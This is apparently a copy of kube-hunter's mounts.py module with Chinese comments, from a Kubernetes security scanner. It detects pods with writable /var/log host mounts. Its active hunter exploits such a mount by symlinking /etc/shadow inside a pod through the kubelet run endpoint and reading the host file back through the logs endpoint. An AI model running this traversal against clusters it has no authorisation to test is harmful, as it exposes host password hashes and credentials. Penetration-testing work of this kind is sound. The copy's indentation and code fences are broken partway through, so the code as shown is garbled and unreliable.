# `kubehunter\kube_hunter\modules\hunting\mounts.py`

```
# 导入 logging 模块，用于记录日志
import logging
# 导入 re 模块，用于正则表达式操作
import re
# 导入 uuid 模块，用于生成唯一标识符
import uuid

# 从 kube_hunter.conf 模块中导入 config 对象
from kube_hunter.conf import config
# 从 kube_hunter.core.events 模块中导入 handler 函数
from kube_hunter.core.events import handler
# 从 kube_hunter.core.events.types 模块中导入 Event 和 Vulnerability 类
from kube_hunter.core.events.types import Event, Vulnerability
# 从 kube_hunter.core.types 模块中导入 ActiveHunter, Hunter, KubernetesCluster, PrivilegeEscalation 类
from kube_hunter.core.types import ActiveHunter, Hunter, KubernetesCluster, PrivilegeEscalation
# 从 kube_hunter.modules.hunting.kubelet 模块中导入 ExposedPodsHandler, ExposedRunHandler, KubeletHandlers 类
from kube_hunter.modules.hunting.kubelet import ExposedPodsHandler, ExposedRunHandler, KubeletHandlers

# 获取当前模块的日志记录器对象
logger = logging.getLogger(__name__)
# 创建一个类，用于表示在/var/log目录中创建符号链接的漏洞
class WriteMountToVarLog(Vulnerability, Event):
    """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traversal"""

    def __init__(self, pods):
        # 初始化漏洞对象，设置漏洞所属的Kubernetes集群，漏洞名称，漏洞类别和漏洞ID
        Vulnerability.__init__(
            self, KubernetesCluster, "Pod With Mount To /var/log", category=PrivilegeEscalation, vid="KHV047",
        )
        # 设置pods属性
        self.pods = pods
        # 设置evidence属性，用于记录相关证据
        self.evidence = "pods: {}".format(", ".join((pod["metadata"]["name"] for pod in self.pods)))


# 创建一个类，用于表示使用Kubelet进行目录遍历的漏洞
class DirectoryTraversalWithKubelet(Vulnerability, Event):
    """An attacker can run commands on pods with mount to /var/log,
    and traverse read all files on the host filesystem"""

    def __init__(self, output):
        # 初始化漏洞对象，设置漏洞所属的Kubernetes集群，漏洞名称，漏洞类别
        Vulnerability.__init__(
            self, KubernetesCluster, "Root Traversal Read On The Kubelet", category=PrivilegeEscalation,
```

        )
        # 设置输出属性
        self.output = output
        # 设置证据属性，记录输出信息
        self.evidence = "output: {}".format(self.output)

# 订阅ExposedPodsHandler事件，定义VarLogMountHunter类
@handler.subscribe(ExposedPodsHandler)
class VarLogMountHunter(Hunter):
    """Mount Hunter - /var/log
    Hunt pods that have write access to host's /var/log. in such case,
    the pod can traverse read files on the host machine
    """

    # 初始化方法，接收事件参数
    def __init__(self, event):
        self.event = event

    # 检查pod是否有对指定路径的写入挂载
    def has_write_mount_to(self, pod_data, path):
        """Returns volume for correlated writable mount"""
        # 遍历pod的卷
        for volume in pod_data["spec"]["volumes"]:
            # 如果是hostPath类型的卷
            if "hostPath" in volume:
                # 如果hostPath类型是Directory
                if "Directory" in volume["hostPath"]["type"]:
# 如果volume的hostPath的路径以指定的path开头，则返回该volume
if volume["hostPath"]["path"].startswith(path):
    return volume

# 执行方法
def execute(self):
    # 初始化pe_pods列表
    pe_pods = []
    # 遍历事件中的pods
    for pod in self.event.pods:
        # 如果pod有写入挂载到指定路径（/var/log）的情况
        if self.has_write_mount_to(pod, path="/var/log"):
            # 将符合条件的pod添加到pe_pods列表中
            pe_pods.append(pod)
    # 如果pe_pods列表不为空
    if pe_pods:
        # 发布WriteMountToVarLog事件，包含符合条件的pods
        self.publish_event(WriteMountToVarLog(pods=pe_pods))

# 订阅ExposedRunHandler事件，并定义ProveVarLogMount类
@handler.subscribe(ExposedRunHandler)
class ProveVarLogMount(ActiveHunter):
    """Prove /var/log Mount Hunter
    Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log
    """

    # 初始化方法，接收事件参数
    def __init__(self, event):
        self.event = event
# 设置基础路径为事件主机和端口的组合
self.base_path = f"https://{self.event.host}:{self.event.port}"

# 运行命令在容器中，返回运行结果
def run(self, command, container):
    # 构建运行命令的URL
    run_url = KubeletHandlers.RUN.value.format(
        podNamespace=container["namespace"], podID=container["pod"], containerName=container["name"], cmd=command,
    )
    # 发送POST请求并返回结果
    return self.event.session.post(f"{self.base_path}/{run_url}", verify=False).text

# 获取/var/log挂载的容器
def get_varlog_mounters(self):
    # 访问ProveVarLogMount上的/pods
    logger.debug("accessing /pods manually on ProveVarLogMount")
    # 发送GET请求获取所有pods的信息
    pods = self.event.session.get(
        f"{self.base_path}/" + KubeletHandlers.PODS.value, verify=False, timeout=config.network_timeout,
    ).json()["items"]
    # 遍历所有pods
    for pod in pods:
        # 检查是否有挂载到/var/log的卷
        volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
        if volume:
            # 返回挂载到/var/log的pod和卷
            yield pod, volume

# 从挂载名称获取挂载路径
def mount_path_from_mountname(self, pod, mount_name):
        """returns container name, and container mount path correlated to mount_name"""
        # 遍历 pod 中的容器
        for container in pod["spec"]["containers"]:
            # 遍历容器中的卷挂载
            for volume_mount in container["volumeMounts"]:
                # 如果卷挂载的名称与指定的名称相符，则返回容器和挂载路径
                if volume_mount["name"] == mount_name:
                    logger.debug(f"yielding {container}")
                    yield container, volume_mount["mountPath"]

    def traverse_read(self, host_file, container, mount_path, host_path):
        """Returns content of file on the host, and cleans trails"""
        # 创建一个唯一的符号链接名
        symlink_name = str(uuid.uuid4())
        # 创建指向文件的符号链接
        self.run(f"ln -s {host_file} {mount_path}/{symlink_name}", container)
        # 使用 kubelet 跟随符号链接
        path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(
            path=re.sub(r"^/var/log", "", host_path) + symlink_name
        )
        # 从主机上获取文件内容，并清除尾随字符
        content = self.event.session.get(
            f"{self.base_path}/{path_in_logs_endpoint}", verify=False, timeout=config.network_timeout,
        ).text
        # 删除符号链接
# 删除指定路径下的符号链接文件
self.run(f"rm {mount_path}/{symlink_name}", container=container)
# 返回内容
return content

# 执行函数
def execute(self):
    # 获取/var/log挂载点的pod和volume
    for pod, volume in self.get_varlog_mounters():
        # 遍历挂载点的pod和volume，获取相关的container和挂载路径
        for container, mount_path in self.mount_path_from_mountname(pod, volume["name"]):
            # 记录相关的container和挂载点名称
            logger.debug("Correlated container to mount_name")
            # 构建包含container名称、pod名称和命名空间的字典
            cont = {
                "name": container["name"],
                "pod": pod["metadata"]["name"],
                "namespace": pod["metadata"]["namespace"],
            }
            try:
                # 尝试利用遍历读取函数获取/etc/shadow文件内容
                output = self.traverse_read(
                    "/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"],
                )
                # 发布事件，指示存在Kubelet的目录遍历漏洞
                self.publish_event(DirectoryTraversalWithKubelet(output=output))
            except Exception:
                # 记录无法利用/var/log的异常情况
                logger.debug("Could not exploit /var/log", exc_info=True)
```